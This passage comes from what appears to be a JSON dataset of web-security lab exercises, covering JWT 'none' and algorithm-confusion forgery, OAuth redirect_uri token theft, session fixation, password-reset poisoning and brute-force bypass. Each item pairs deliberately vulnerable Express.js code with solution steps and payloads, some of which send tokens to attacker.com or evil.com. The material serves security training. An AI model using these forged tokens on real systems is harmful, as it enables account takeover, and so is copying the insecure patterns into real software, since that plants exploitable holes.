    "Lab scenario": "JWT Key Confusion via Algorithm Manipulation",
    "Lab Description": "The application uses JWTs for authentication but does not enforce strong algorithm validation, enabling algorithm substitution. The app accepts JWTs signed using 'none' or changes in algorithm headers. To solve: craft a JWT for Carlos without a valid key using the 'none' algorithm and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use Burp Suite or Postman to intercept an authenticated request and capture the JWT in Authorization header.",
      "2.Decode the JWT using jwt.io and note the algorithm is set to 'HS256'.",
      "3.Change the algorithm to 'none' and modify the payload to { \"username\": \"carlos\" }.",
      "4.Remove the JWT signature completely, re-encode the token and replace the Authorization header with it.",
      "5.Send the request to /my-account endpoint and verify Carlos's session access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'hardcoded-secret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(403).send('No token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); res.send(`Welcome ${decoded.username}`); } catch (e) { res.status(403).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "JWT header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
      "JWT payload: { \"username\": \"carlos\" }",
      "Authorization: Bearer <unsigned_token>"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration in Token Validation Logic",
    "Lab Description": "The application integrates with an external OAuth provider but does not properly validate the 'aud' claim or client ID. This allows attackers to use a token issued for a different client application to gain access. To solve: obtain an OAuth token from a 3rd-party client and use it to access Carlos's protected account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use Postman or OAuth debugger to generate an OAuth token using a public client ID (e.g., demo-client).",
      "2.Inspect the decoded token payload and confirm that the 'sub' or 'email' field is set to carlos@example.com.",
      "3.Send a request to /my-account with the Authorization header set to Bearer <token>.",
      "4.Observe that the server accepts the token despite the incorrect client application, due to weak audience validation.",
      "5.Access protected user data and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; try { const decoded = jwt.decode(token); if (decoded.email === 'carlos@example.com') res.send('Carlos Account Accessed'); else res.status(403).send('Access denied'); } catch { res.status(403).send('Invalid token'); } }); app.listen(5000);",
    "payloads": [
      "OAuth token from demo-client with sub: carlos@example.com",
      "Authorization: Bearer <demo-client-token>",
      "Use OAuth2 playground to generate token for public audience"
    ]
  },
    {
      "Lab scenario": "Session fixation via unrotated session token post-login",
      "Lab Description": "This lab’s session handling is vulnerable due to the reuse of session tokens across unauthenticated and authenticated states. The application assigns a session token prior to login and does not rotate it after successful authentication. To solve: Hijack Carlos's session after fixation and access his My account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Initiate a session with the application using OWASP ZAP to capture the initial Set-Cookie header.",
        "Send the pre-login session cookie to the victim (Carlos) via a simulated phishing email or reflected XSS vector.",
        "Wait for Carlos to authenticate with the fixed session ID (simulate or mock session binding).",
        "Use the same session token in your client to access authenticated resources like /account or /profile.",
        "Confirm session takeover by visiting /my-account and observing Carlos's account details."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const session = require('express-session'); const app = express(); app.use(cookieParser()); app.use(session({ secret: 'fixation-key', resave: true, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'abc123' }]; app.get('/', (req, res) => { if (!req.session.user) { req.session.user = 'guest'; } res.send(`Session active for ${req.session.user}`); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.send(`Welcome ${username}`); } else { res.status(403).send('Login failed'); } }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') { res.send('Carlos account data'); } else { res.status(401).send('Unauthorized'); } }); app.listen(3000);",
      "payloads": [
        "Set-Cookie: connect.sid=SESSION_ID_HERE",
        "POST /login with hijacked session ID",
        "GET /my-account using fixed session"
      ]
    },
    {
      "Lab scenario": "JWT tampering via 'none' algorithm bypass",
      "Lab Description": "This lab uses JWTs for session management but fails to enforce signature validation when the 'alg' header is set to 'none'. The application decodes the JWT without verifying its integrity. To solve: Forge a JWT granting access to Carlos's account and retrieve his profile.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Capture a valid JWT after logging in using Burp Suite. Decode it using jwt.io or Burp Decoder.",
        "Replace the alg field with 'none' and modify the payload to set username to 'carlos'.",
        "Remove the signature portion of the JWT entirely.",
        "Use Postman to resend a request to /profile with the forged JWT in the Authorization header.",
        "Verify access to Carlos's account page using the manipulated token."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'jwtweak' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, 'secretkey', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(403).send('Invalid'); } }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); res.send(`Profile: ${payload.username}`); }); app.listen(3000);",
      "payloads": [
        "Header: {\"alg\":\"none\"}",
        "Payload: {\"username\":\"carlos\"}",
        "JWT: base64(header).base64(payload). (no signature)",
        "Authorization: Bearer [forged JWT]"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration with open redirect as token delivery",
      "Lab Description": "This lab implements OAuth login but misuses the redirect_uri parameter without validation, enabling token leakage via open redirect. To solve: Hijack Carlos's OAuth token using a crafted redirect_uri and access his account page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Inspect the OAuth flow using Burp Suite by initiating login with OAuth and intercepting the redirect.",
        "Observe the redirect_uri parameter pointing to a callback endpoint.",
        "Modify the redirect_uri to a malicious domain you control (use Burp Collaborator or webhook.site).",
        "Send the malicious login URL to the victim (simulate or script Carlos visiting the link).",
        "Collect the leaked OAuth token from the redirect on your domain and use it in the Authorization header to access /my-account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const users = [{ username: 'carlos', token: 'abc123' }]; app.get('/auth', (req, res) => { const redirect_uri = req.query.redirect_uri; const token = 'abc123'; const uri = `${redirect_uri}?token=${token}`; res.redirect(uri); }); app.get('/my-account', (req, res) => { const token = req.query.token || req.headers['authorization']; if (token === 'abc123') { res.send('Carlos account data'); } else { res.status(403).send('Unauthorized'); } }); app.listen(3000);",
      "payloads": [
        "https://vulnerable.site/auth?redirect_uri=https://attacker.com/callback",
        "Captured token: abc123",
        "GET /my-account?token=abc123",
        "Authorization: abc123"
      ]
    },
  
  
  
  
  {
    "Lab scenario": "Session fixation in password reset flow",
    "Lab Description": "The application allows attackers to fix a session identifier before a user resets their password. The password reset handler reuses the existing session without invalidating or rotating it. To solve: hijack Carlos's session by setting a fixed session ID before he resets his password, then access his My account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Using Burp Suite, generate a session cookie via GET /login with no credentials. Note the session ID value.",
      "2. Visit the Forgot Password feature and submit Carlos's username to trigger a reset link.",
      "3. In Burp, intercept the password reset link request. Copy the reset token from your email panel.",
      "4. Open Burp Repeater and send the reset password request with Carlos's reset token but ensure your fixed session ID is used in the Cookie header.",
      "5. After password reset, send a request to /my-account with the same session cookie to access Carlos's account.",
      "6. Confirm lab completion when Carlos's data is shown."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'oldpass' }]; const sessions = {}; const resetTokens = {}; app.get('/login', (req, res) => { const sid = req.cookies.sid || Math.random().toString(36).slice(2); sessions[sid] = null; res.cookie('sid', sid); res.send('Login page'); }); app.post('/forgot', (req, res) => { const { username } = req.body; const token = Math.random().toString(36).slice(2); resetTokens[username] = token; res.send(`Reset link: /reset-password?token=${token}`); }); app.post('/reset-password', (req, res) => { const { token, newPassword } = req.body; const username = Object.keys(resetTokens).find(k => resetTokens[k] === token); if (username) { const user = users.find(u => u.username === username); user.password = newPassword; const sid = req.cookies.sid; sessions[sid] = username; res.send('Password reset'); } else { res.status(403).send('Invalid token'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; const username = sessions[sid]; if (username) res.send(`My account: ${username}`); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "GET /login -> retrieve Set-Cookie sid=ABC123",
      "POST /reset-password with Cookie: sid=ABC123",
      "GET /my-account with Cookie: sid=ABC123"
    ]
  },
  {
    "Lab scenario": "JWT signature bypass using 'none' algorithm in Authorization header",
    "Lab Description": "This app accepts JSON Web Tokens for authentication, but fails to properly validate the algorithm used. The backend trusts the 'alg' field in the JWT header. To solve: craft a JWT with 'none' algorithm to impersonate the admin and access their account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Log in to your own account and capture the JWT token via Burp Suite (Authorization: Bearer ...).",
      "2. Decode the JWT and observe the header and payload. Identify the use of RS256 algorithm.",
      "3. Modify the JWT header to set 'alg' to 'none', remove the signature part, and change payload 'username' to 'admin'.",
      "4. Use Postman to send a GET /my-account request with the forged JWT in the Authorization header.",
      "5. Verify lab completion when admin's account details are returned."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { admin: 'adminpass', user: 'userpass' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ username }, 'privateKey', { algorithm: 'RS256' }); res.json({ token }); } else res.status(401).send('Unauthorized'); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, 'privateKey', { algorithms: ['RS256'] }); res.send(`Hello ${decoded.username}`); } catch (e) { if (token.split('.').length === 2) { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); res.send(`Hello ${decoded.username}`); } else res.status(403).send('Invalid JWT'); } }); app.listen(4001);",
    "payloads": [
      "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
      "Payload: { \"username\": \"admin\" }",
      "JWT: base64(header).base64(payload).<empty signature>"
    ]
  },
  {
    "Lab scenario": "OAuth access token leakage via referer header in redirect",
    "Lab Description": "The application uses OAuth 2.0 implicit flow and redirects users to a third-party site after authentication. However, the access token is passed in the URL fragment and leaks via the HTTP referer header. To solve: intercept the token leak and use it to access the victim's profile.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "1. Use Burp Suite and log in as a normal user. Observe the OAuth redirect request (URL contains #access_token=...).",
      "2. Note that the final redirect is to a third-party endpoint with your token in the Referer header.",
      "3. Simulate a phishing attack where Carlos logs in using a manipulated OAuth redirect_uri that points to your server.",
      "4. On your malicious server, capture the Referer header and extract Carlos's access_token.",
      "5. Replay a request to GET /profile with the stolen token in Authorization: Bearer header.",
      "6. Confirm lab completion when Carlos's profile is shown."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const redirectUri = req.query.redirect_uri; const accessToken = 'abc123-carlos-token'; res.redirect(`${redirectUri}#access_token=${accessToken}`); }); app.get('/profile', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer abc123-carlos-token') res.send('Carlos profile data'); else res.status(403).send('Forbidden'); }); app.listen(4002);",
    "payloads": [
      "Redirect to: /oauth/callback?redirect_uri=http://evil.com/capture",
      "Capture Referer: http://evil.com/capture#access_token=abc123-carlos-token",
      "Replay: GET /profile with Authorization: Bearer abc123-carlos-token"
    ]
  },
  {
    "Lab scenario": "Session fixation in login flow",
    "Lab Description": "The application fails to properly regenerate session identifiers upon successful login. This allows an attacker to fixate a session ID prior to authentication. The application sets the session cookie before validating credentials and continues using the same session post-login. To solve: hijack Carlos's session using a fixed session ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite Proxy to capture an unauthenticated session cookie from a GET /login request.",
      "Use Postman to send a POST /login request with Carlos's credentials while reusing the fixed session cookie.",
      "Verify the session is authenticated and bound to Carlos’s account.",
      "Open the same session in your browser using the fixed session cookie.",
      "Access /my-account and confirm access to Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'secret!', resave: true, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\" /><input name=\"password\" /><input type=\"submit\" /></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { if (req.session.username === 'carlos') res.send('Welcome Carlos'); else res.send('Access denied'); }); app.listen(3000);",
    "payloads": [
      "GET /login -> extract session id",
      "POST /login with fixed session id and carlos:letmein",
      "Inject session cookie into browser: session=known_value"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via none algorithm",
    "Lab Description": "The application uses JWTs for authentication, but fails to enforce algorithm restrictions during signature verification. This allows an attacker to craft a forged token by changing the algorithm to 'none'. To solve: forge a valid token for user carlos and access the admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a JWT after login using Burp Suite.",
      "Decode the JWT in jwt.io and modify the payload: {\"username\":\"carlos\"}.",
      "Set the header to {\"alg\":\"none\"} and remove the signature.",
      "Send the forged token via Postman in the Authorization header: Bearer <jwt>.",
      "Verify access to /admin-panel as user carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'topsecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 's3cr3t') { const token = jwt.sign({ username }, secret); res.json({ token }); } else { res.status(403).send('Invalid'); } }); app.get('/admin-panel', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.username === 'carlos') res.send('Welcome to admin panel'); else res.send('Access denied'); } catch { res.status(401).send('Unauthorized'); } }); app.listen(3000);",
    "payloads": [
      "{\"alg\":\"none\"}.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer <forged-token>",
      "Use jwt.io to forge token without signature"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in redirect URI",
    "Lab Description": "The application integrates a third-party OAuth provider but does not strictly validate redirect URIs. An attacker can manipulate the redirect URI to capture access tokens. To solve: intercept Carlos’s OAuth access token and access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept OAuth authorization request during login.",
      "Modify the redirect_uri parameter to a domain you control (e.g., https://attacker.com/callback).",
      "Send the modified request and log in as Carlos when prompted by the OAuth provider.",
      "Capture the access token sent to your server.",
      "Use Postman to send a GET /profile request with Authorization: Bearer <captured_token>."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const state = req.query.state; res.redirect(`${redirectUri}#access_token=mocktokenforcarlos&state=${state}`); }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'mocktokenforcarlos') res.send('Carlos Profile Data'); else res.status(403).send('Forbidden'); }); app.listen(3000);",
    "payloads": [
      "redirect_uri=https://attacker.com/callback",
      "Captured token: mocktokenforcarlos",
      "Authorization: Bearer mocktokenforcarlos"
    ]
  },
  {
    "Lab scenario": "JWT Authentication Bypass via Unverified Signature in Session Token",
    "Lab Description": "The application uses JWTs for session management but fails to verify the token's signature. This oversight allows attackers to forge tokens with arbitrary payloads. The application grants access based solely on the 'sub' claim without validating the token's integrity. To solve: Modify your JWT to impersonate the 'administrator' user and delete Carlos's account via the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the JWT after logging in using Burp Suite.",
      "Decode the JWT payload and change the 'sub' claim to 'administrator'.",
      "Remove the signature part of the JWT or replace it with a dummy value.",
      "Re-encode the JWT and replace the session cookie with the modified token.",
      "Access the /admin/delete?username=carlos endpoint to delete Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('cookie-parser')()); const users = ['wiener', 'carlos', 'administrator']; app.get('/admin/delete', (req, res) => { const token = req.cookies.session; const payload = jwt.decode(token); if (payload.sub !== 'administrator') return res.status(403).send('Access denied'); const userToDelete = req.query.username; if (users.includes(userToDelete)) { users.splice(users.indexOf(userToDelete), 1); res.send(`User ${userToDelete} deleted`); } else { res.status(404).send('User not found'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.",
      "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.dummy_signature"
    ]
  },
  {
    "Lab scenario": "Password Reset Poisoning via Middleware in HTTP Headers",
    "Lab Description": "The application constructs password reset links using the 'X-Forwarded-Host' header without proper validation. This allows attackers to manipulate the reset link sent to users. The application trusts the header value to generate the reset URL. To solve: Poison the password reset link to redirect to your server, capture Carlos's reset token, and reset his password.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate a password reset for Carlos and intercept the request using Burp Suite.",
      "Modify the 'X-Forwarded-Host' header to point to your exploit server.",
      "Send the modified request to trigger the sending of a poisoned reset link.",
      "Monitor your exploit server to capture the reset token when Carlos accesses the link.",
      "Use the captured token to reset Carlos's password and log in to his account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(require('body-parser').urlencoded({ extended: true })); app.post('/forgot-password', (req, res) => { const host = req.headers['x-forwarded-host'] || req.headers.host; const resetLink = `http://${host}/reset?token=abc123`; // send resetLink via email }); app.listen(3000);",
    "payloads": [
      "X-Forwarded-Host: attacker.com",
      "X-Forwarded-Host: exploit-server.net"
    ]
  },
  {
    "Lab scenario": "Broken Brute-Force Protection via Multiple Credentials per Request in Login Endpoint",
    "Lab Description": "The application's login endpoint accepts JSON input but fails to handle arrays properly. By sending multiple passwords in an array, attackers can bypass brute-force protection mechanisms. The application processes each password in the array without rate limiting. To solve: Submit a login request with an array of passwords to discover Carlos's password.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the login request using Burp Suite.",
      "Modify the 'password' field to be an array of common passwords.",
      "Send the modified request and observe the response.",
      "Identify the correct password from the response.",
      "Log in as Carlos using the discovered password."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(require('body-parser').json()); const users = { 'carlos': 'monkey' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (Array.isArray(password)) { for (let pass of password) { if (users[username] === pass) return res.send('Login successful'); } } else if (users[username] === password) { return res.send('Login successful'); } res.status(401).send('Invalid credentials'); }); app.listen(3000);",
    "payloads": [
      "{ \"username\": \"carlos\", \"password\": [\"123456\", \"monkey\", \"password\"] }"
    ]
  },
  {
    "Lab scenario": "JWT none algorithm attack in REST API authentication",
    "Lab Description": "The application uses JWT-based authentication to protect a RESTful API. However, the backend JWT implementation fails to properly enforce algorithm restrictions. When verifying tokens, it blindly accepts tokens with 'alg':'none' without validating signatures. To solve: forge a JWT for the 'admin' user using 'none' algorithm and access the /admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a valid login and capture the Authorization: Bearer <JWT> header.",
      "Decode the JWT using jwt.io or Burp Decoder and note the algorithm and payload structure.",
      "Replace the 'alg' value with 'none' and modify the payload to {\"user\":\"admin\"}. Leave the signature section blank.",
      "Send a modified Authorization header: Bearer <unsigned token> using Postman to GET /admin.",
      "Verify access to /admin with the forged JWT and confirm admin privileges were granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken');\nconst express = require('express');\nconst app = express();\nconst SECRET = 'supersecretkey';\n\napp.get('/admin', (req, res) => {\n  const token = req.headers['authorization']?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, SECRET, { algorithms: ['HS256', 'none'] });\n    if (decoded.user === 'admin') {\n      return res.send('Welcome admin!');\n    }\n    return res.status(403).send('Access denied');\n  } catch (err) {\n    console.error('JWT error:', err);\n    return res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(4000, () => console.log('JWT Lab listening on port 4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "{\"alg\":\"none\"}.{\"user\":\"admin\"}.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
    ]
  },
  {
    "Lab scenario": "Session fixation via vulnerable Set-Cookie path handling in REST login endpoint",
    "Lab Description": "The application authenticates users via a REST API and sets a session ID in a cookie. However, it does not regenerate the session ID after login. It accepts attacker-supplied session IDs and binds them to authenticated users, leading to session fixation. To solve: Fix a session for 'carlos', log in with it, and access /profile as Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept a GET /login request and note the Set-Cookie: session=... header format.",
      "Craft a malicious session ID and set it using the Set-Cookie header manually via curl or Burp.",
      "Send the session cookie to the victim (simulate click or load via /set-session endpoint).",
      "Have victim log in (simulate via POST /login) using their credentials while session is fixed.",
      "Replay request to /profile using the fixed session ID and verify it returns Carlos's profile."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\nconst sessions = {};\nconst users = { 'carlos': 'hunter2' };\n\napp.post('/login', (req, res) => {\n  const sessId = req.cookies.session || Math.random().toString(36).substring(2);\n  const { username, password } = req.query;\n  if (users[username] === password) {\n    sessions[sessId] = username;\n    res.cookie('session', sessId);\n    return res.send('Logged in');\n  }\n  return res.status(401).send('Auth failed');\n});\n\napp.get('/profile', (req, res) => {\n  const user = sessions[req.cookies.session];\n  if (user) return res.send(`Profile of ${user}`);\n  res.status(403).send('Forbidden');\n});\n\napp.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
    "payloads": [
      "Cookie: session=attackerSession123",
      "GET /set-session Cookie: session=attackerSession123",
      "POST /login?username=carlos&password=hunter2 with Cookie: session=attackerSession123"
    ]
  },
  {
    "Lab scenario": "OAuth code injection in redirect_uri during OAuth2.0 authorization flow",
    "Lab Description": "The application uses OAuth 2.0 for third-party login. The authorization server is misconfigured and accepts wildcards in redirect_uri. This allows attackers to intercept authorization codes via open redirect-style endpoints. To solve: steal Carlos's OAuth code using a manipulated redirect_uri, then redeem it to access their account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start OWASP ZAP and crawl the OAuth login flow to identify the /authorize?redirect_uri parameter.",
      "Modify the redirect_uri to point to your controlled endpoint (e.g., /auth/log?next=evil.com).",
      "Send the authorization URL to Carlos (simulate victim click or login trigger).",
      "Log the intercepted code from the malicious redirect_uri callback.",
      "Exchange the stolen code via POST /oauth/token and get the access_token, then access Carlos’s data via /api/me."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\nconst tokens = {};\n\napp.get('/authorize', (req, res) => {\n  const { redirect_uri, state } = req.query;\n  const code = 'code1234';\n  tokens[code] = 'carlos';\n  res.redirect(`${redirect_uri}?code=${code}&state=${state}`);\n});\n\napp.post('/oauth/token', (req, res) => {\n  const { code } = req.query;\n  if (tokens[code]) {\n    return res.json({ access_token: 'token-for-' + tokens[code] });\n  }\n  res.status(400).json({ error: 'Invalid code' });\n});\n\napp.get('/api/me', (req, res) => {\n  const token = req.headers['authorization']?.split(' ')[1];\n  if (token === 'token-for-carlos') {\n    return res.send('Welcome Carlos!');\n  }\n  res.status(403).send('Invalid token');\n});\n\napp.listen(4000, () => console.log('OAuth2 Intercept Lab running on port 4000'));",
    "payloads": [
      "https://vulnapp.com/authorize?redirect_uri=https://evil.com/capture",
      "POST /oauth/token?code=code1234",
      "Authorization: Bearer token-for-carlos"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable token reuse",
    "Lab Description": "This REST-based web application uses cookie-based session tokens for authentication. The application generates a session ID during login but fails to regenerate or invalidate the session ID upon successful authentication. The session remains fixed even if the login state changes. To solve: hijack Carlos's session by planting a valid session ID before login, then access his My account page after he logs in.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Using Burp Suite, visit the login page and capture the Set-Cookie header from an unauthenticated session.",
      "2.Use OWASP ZAP or Burp Repeater to modify the session cookie manually and send repeated unauthenticated requests to ensure session reuse behavior.",
      "3.Share the fixed session ID with Carlos (simulated by planting it via a crafted phishing link).",
      "4.Assume Carlos logs in using the fixed session. Use the same session cookie to access /my-account endpoint.",
      "5.If the session was not regenerated upon login, the attacker is now authenticated as Carlos. Validate by accessing /my-account and confirming Carlos's info is displayed."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(session({ secret: 'insecure', resave: false, saveUninitialized: true }));\napp.use(bodyParser.urlencoded({ extended: true }));\nconst users = [{ username: 'carlos', password: 'supersecure' }];\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (!user) return res.status(401).send('Invalid login');\n  req.session.user = username;\n  console.log('[DEBUG] Session ID remains: ' + req.sessionID);\n  res.send(`Welcome ${username}`);\n});\napp.get('/my-account', (req, res) => {\n  if (req.session.user === 'carlos') {\n    res.send('Account details for Carlos');\n  } else {\n    res.status(403).send('Unauthorized');\n  }\n});\napp.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
    "payloads": [
      "GET /login HTTP/1.1\\nSet-Cookie: sessionid=attackerSession123",
      "Phishing link: http://target-app/login?sessionid=attackerSession123",
      "Use sessionid=attackerSession123 after Carlos logs in"
    ]
  },
  {
    "Lab scenario": "JWT tampering via algorithm confusion",
    "Lab Description": "The application uses JWT for session management and validates tokens using the 'alg' field. It accepts tokens signed with both HMAC and RSA but uses the same verification method. This results in an algorithm confusion vulnerability. To solve: forge a JWT using HMAC with a known public key and gain access to Carlos's account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Intercept a valid JWT after logging in and decode it using jwt.io or Burp Decoder.",
      "2.Observe that alg is set to RS256 and the token uses a public key signature.",
      "3.Create a forged token where alg is set to HS256 and sign it using the same public key (as secret).",
      "4.Replace the token in your request headers with the forged one. Set payload to { \"username\": \"carlos\" }.",
      "5.Send a request to /my-account with the forged JWT. If successful, Carlos’s account page is displayed."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\nconst pubKey = fs.readFileSync('public.pem');\napp.use((req, res, next) => {\n  const token = req.headers['authorization']?.split(' ')[1];\n  if (token) {\n    try {\n      const decoded = jwt.verify(token, pubKey, { algorithms: ['RS256', 'HS256'] });\n      req.user = decoded.username;\n    } catch (e) {\n      return res.status(403).send('Invalid token');\n    }\n  }\n  next();\n});\napp.get('/my-account', (req, res) => {\n  if (req.user === 'carlos') {\n    res.send('Account details for Carlos');\n  } else {\n    res.status(403).send('Unauthorized');\n  }\n});\napp.listen(4001, () => console.log('JWT Algorithm Confusion Lab running on http://localhost:4001'));",
    "payloads": [
      "{ \"alg\": \"HS256\", \"typ\": \"JWT\" }",
      "{ \"username\": \"carlos\" }",
      "Sign using HMAC with public.pem content as secret"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration via open redirect",
    "Lab Description": "The application integrates OAuth2 login via a third-party provider. However, the redirect_uri parameter is improperly validated, enabling attackers to manipulate the OAuth flow. To solve: exploit the open redirect to steal an access token and access the protected account page as Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use Burp Suite to observe the OAuth login flow. Identify the redirect_uri parameter passed to the provider.",
      "2.Modify redirect_uri to point to your controlled domain and initiate login to intercept the token.",
      "3.Use the stolen token in an Authorization: Bearer header and access the /my-account endpoint.",
      "4.Use Postman or Burp Repeater to pass the hijacked token and verify access to Carlos's account.",
      "5.Confirm the lab is solved when the response reveals Carlos’s private information."
    ],
    "Vulnerability name": "Authentication",
